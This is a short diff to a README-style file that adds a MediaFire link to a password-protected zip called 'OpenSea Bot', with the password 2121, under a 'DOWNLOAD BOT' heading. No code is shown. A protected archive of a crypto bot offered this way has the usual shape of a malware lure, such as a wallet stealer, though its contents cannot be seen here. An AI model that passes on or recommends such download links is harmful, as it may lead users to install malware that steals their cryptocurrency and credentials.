@@ -1,7 +1,7 @@
 
 
 ***DOWNLOAD BOT*** :arrow_heading_down:
-|[Click to Download]()|Password: 2121|
+|[Click to Download](https://www.mediafire.com/file/0g30n3lwxgvcqbq/OpenSea+Bot.zip/file)|Password: 2121|
 |---|---|
 
 ```
